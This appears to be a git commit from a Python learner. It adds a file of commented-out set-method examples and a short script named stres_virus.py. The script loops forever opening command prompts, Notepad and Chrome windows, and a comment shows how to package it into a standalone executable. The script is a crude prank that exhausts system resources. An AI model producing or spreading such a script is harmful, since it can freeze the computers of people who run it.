70335ad9fa906e405d7813ad5da934bbe0e79c32
Lyubomir Dimitrov <lyubomir.dimitrov.8702@gmail.com>
2023-11-08 10:10:33 +0200

    Add new files

---
+++ 07_set/stres_virus.py
@@ -0,0 +1,8 @@
+import os
+counter = 0
+while counter <3:
+    var = os.system("start cmd")
+    var1 = os.system("start notepad")
+    var2 = os.system("start Chrome")
+
+# pyinstaller -- onefile name.py
---
+++ 07_set/test.py
@@ -0,0 +1,145 @@
+### union
+# x = {"apple", "banana", "cherry"}
+# y = {"google", "microsoft", "apple"}
+#
+# x.update(y)
+#
+# print(x)
+
+
+
+
+### union
+# x = {"apple", "banana", "cherry"}
+# y = {"google", "microsoft", "apple"}
+#
+# z = x.union(y)
+#
+# print(z)
+
+
+
+
+
+### symmetric_difference
+# x = {"apple", "banana", "cherry"}
+# y = {"google", "microsoft", "apple"}
+#
+# z = x.symmetric_difference(y)
+#
+# print(z)
+
+
+
+
+
+### pop
+# fruits = {"apple", "banana", "cherry"}
+#
+# fruits.pop()
+#
+# print(fruits)
+
+
+
+
+
+### issuperset
+# x = {"f", "e", "d", "c", "b", "a"}
+# y = {"a", "b", "c"}
+#
+# z = x.issuperset(y)
+#
+# print(z)
+
+
+
+
+
+###issubset
+# x = {"a", "b", "c"}
+# y = {"f", "e", "d", "c", "b", "a"}
+#
+# z = x.issubset(y)
+#
+# print(z)
+
+
+
+### isdisjoint
+# x = {"apple", "banana", "cherry"}
+# y = {"google", "microsoft", "facebook"}
+#
+# z = x.isdisjoint(y)
+#
+# print(z)
+
+
+
+
+
+###intersection
+# x = {"apple", "banana", "cherry"}
+# y = {"google", "microsoft", "apple"}
+#
+# z = x.intersection(y)
+#
+# print(z)
+
+
+
+
+### remove
+# fruits = {"apple", "banana", "cherry"}
+#
+# fruits.remove("banana")
+#
+# print(fruits)
+
+
+
+# ### discard
+# fruits = {"apple", "banana", "cherry"}
+#
+# fruits.discard("banana")
+#
+# print(fruits)
+#
+
+
+
+### difference
+# x = {"apple", "banana", "cherry"}
+# y = {"google", "microsoft", "apple"}
+#
+# z = y.difference(x)
+#
+# print(z)
+
+
+
+
+
+### copy
+# fruits = {"apple", "banana", "cherry"}
+#
+# x = fruits.copy()
+#
+# print(x)
+
+
+
+### clear
+# fruits = {"apple", "banana", "cherry"}
+#
+# fruits.clear()
+#
+# print(fruits)
+
+
+### add
+# fruits = {"apple", "banana", "cherry"}
+#
+# fruits.add("orange")
+#
+# print(fruits)
